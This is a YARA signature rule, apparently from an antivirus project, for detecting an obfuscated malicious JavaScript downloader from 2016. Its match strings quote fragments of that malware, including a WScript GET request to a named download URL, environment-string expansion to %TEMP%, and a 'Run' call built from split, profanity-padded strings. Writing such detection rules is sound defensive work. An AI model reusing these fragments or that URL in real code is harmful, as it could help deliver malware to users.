rule sig_20160428_70218d75793f0df3463081a00241c14d {
  meta:
    description = "datamaliciousorder - file 20160428_70218d75793f0df3463081a00241c14d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e2a74c22a0fd2651b3fdf263b0fd49c94cd6a3dc1d35195a0d8d3bc05284330f"

  strings:
    $s1  = "WpxBkeJolGaoVjrRiqNwc[XoqCnvUekBdjHduIhnFoz](\"G\" + \"ET\", \"http://laichaupc.com/m8eusk\", false);" fullword ascii
    $s2  = "function KskTgmYwqMaoYumWdgEle() {return VksBfbAmlNmhAqlBriYdk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function BryXneSbsSbuSkiAfgWyl(YofYtvTpdAvoFitCcoNrr){VksBfbAmlNmhAqlBriYdk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function BryXneSbsSbuSkiAfgWyl(YofYtvTpdAvoFitCcoNrr){VksBfbAmlNmhAqlBriYdk[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "return XzzDwkAbnFzwCemDbhRmu - DmeKnnDdcZhnQajPbsGjl;};" fullword ascii
    $s6  = "function KchVxuPnkLzrQbrWmzWuu(XzzDwkAbnFzwCemDbhRmu, DmeKnnDdcZhnQajPbsGjl){KdbWukUakMnmOrrHwxImn = KdbWukUakMnmOrrHwxImn * 1; " ascii
    $s7  = "var VksBfbAmlNmhAqlBriYdk = function RyyMoqYiqSubLbmZjgWzk() {return OuzGgyQqzKjgUqgCprFac[UggWwpWkqGcxFhlNinUkl](\"WScript\"+\"" ascii
    $s8  = "var VksBfbAmlNmhAqlBriYdk = function RyyMoqYiqSubLbmZjgWzk() {return OuzGgyQqzKjgUqgCprFac[UggWwpWkqGcxFhlNinUkl](\"WScript\"+\"" ascii
    $s9  = "var OuzGgyQqzKjgUqgCprFac = this[\"WScript\"];" fullword ascii
    $s10 = "function KskTgmYwqMaoYumWdgEle() {return VksBfbAmlNmhAqlBriYdk[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function KchVxuPnkLzrQbrWmzWuu(XzzDwkAbnFzwCemDbhRmu, DmeKnnDdcZhnQajPbsGjl){KdbWukUakMnmOrrHwxImn = KdbWukUakMnmOrrHwxImn * 1; " ascii
    $s12 = "function WkzNsrEgtQhpFqxJsnYeh(){return ZzxQcpJodQuiZiwExqAyh + \"\";};" fullword ascii
    $s13 = "if (WpxBkeJolGaoVjrRiqNwc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "var OanJlhQaiHytYsiKauSpc = false;" fullword ascii
    $s15 = "return KchVxuPnkLzrQbrWmzWuu(1 == 1 ? VztKhpEdxEvpDnwRqtKqq : 0, 1 == 1 ? LzrQdsTlgOstUouLotFvd : 0);" fullword ascii
    $s16 = "function PtkWndMjbQcgNzfJifKpy(){return 23;};" fullword ascii
    $s17 = "var SjvEsiXgjQskIkyByqLva = false;" fullword ascii
    $s18 = "OanJlhQaiHytYsiKauSpc = true;" fullword ascii
    $s19 = "var FysBvfLbnJeeNvdWrnTlc = false;" fullword ascii
    $s20 = "function SulNibImsWmiYghTwbRjn(EquSdfZmlEkmYmfEdhGbv) {var IhwQppYpbGubPhbNjaAav = (1, 2, 3, 4, 5, EquSdfZmlEkmYmfEdhGbv); retur" ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}